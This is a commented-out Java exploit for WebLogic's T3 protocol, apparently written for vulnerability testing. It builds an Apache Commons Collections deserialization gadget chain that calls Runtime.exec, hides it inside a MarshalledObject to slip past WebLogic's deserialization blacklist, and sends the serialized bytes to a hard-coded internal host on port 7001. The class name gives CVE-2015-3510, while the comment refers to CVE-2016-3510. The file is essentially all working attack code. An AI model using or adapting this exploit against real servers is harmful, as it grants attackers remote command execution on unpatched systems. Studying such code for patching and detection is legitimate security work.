//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//import org.apache.commons.collections.map.LazyMap;
//import weblogic.corba.utils.MarshalledObject;
//
//import java.io.ByteArrayOutputStream;
//import java.io.ObjectOutputStream;
//import java.lang.reflect.InvocationHandler;
//import java.lang.reflect.Proxy;
//
//import java.util.HashMap;
//import java.util.Map;
//
//import static util.t3tool.WeblogicT3.*;
//
//public class T3_CVE_2015_3510 {
//
//    public static byte[] getPayload(String cmd) throws Exception {
//
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
//                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{cmd})
//        };
//
//        final Transformer transformerChain = new ChainedTransformer(transformers);
//        final Map innerMap = new HashMap();
//
//        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
//
//        InvocationHandler handler = (InvocationHandler) getFirstCtor(
//                "sun.reflect.annotation.AnnotationInvocationHandler")
//                .newInstance(Override.class, lazyMap);
//
//        final Map mapProxy = Map.class
//                .cast(Proxy.newProxyInstance(Map.class.getClassLoader(),
//                        new Class[]{Map.class}, handler));
//
//        handler = (InvocationHandler) getFirstCtor(
//                "sun.reflect.annotation.AnnotationInvocationHandler")
//                .newInstance(Override.class, mapProxy);
//
//        /*
//        3 \CVE-2016-3510 对CVE-2016-0638黑名单的绕过，其绕过方式和CVE-2016-0638绕过CVE2015-4852一样
//         序列化数据 MarshalledObject绕过，MarshalledObject首先不在黑名单中，并且其readResolve方法中对其某个变量调用readObject
//         */
//        Object obj = new MarshalledObject(handler);
//        ByteArrayOutputStream out = new ByteArrayOutputStream();
//        ObjectOutputStream objOut = new ObjectOutputStream(out);
//        objOut.writeObject(obj);
//
//
//        objOut.flush();
//        objOut.close();
//        byte[] payload = out.toByteArray();
//
//        return  payload;
//    }
//
//    public static void main(String[] args) throws Exception {
//
//        String host = "10.58.120.200";
//        String port = "7001";
//        String cmd = "touch /tmp/T3_CVE_2015_3510";
//
//        byte[] payload = getPayload(cmd);
//        t3Send(host, port, payload);
//    }
//}
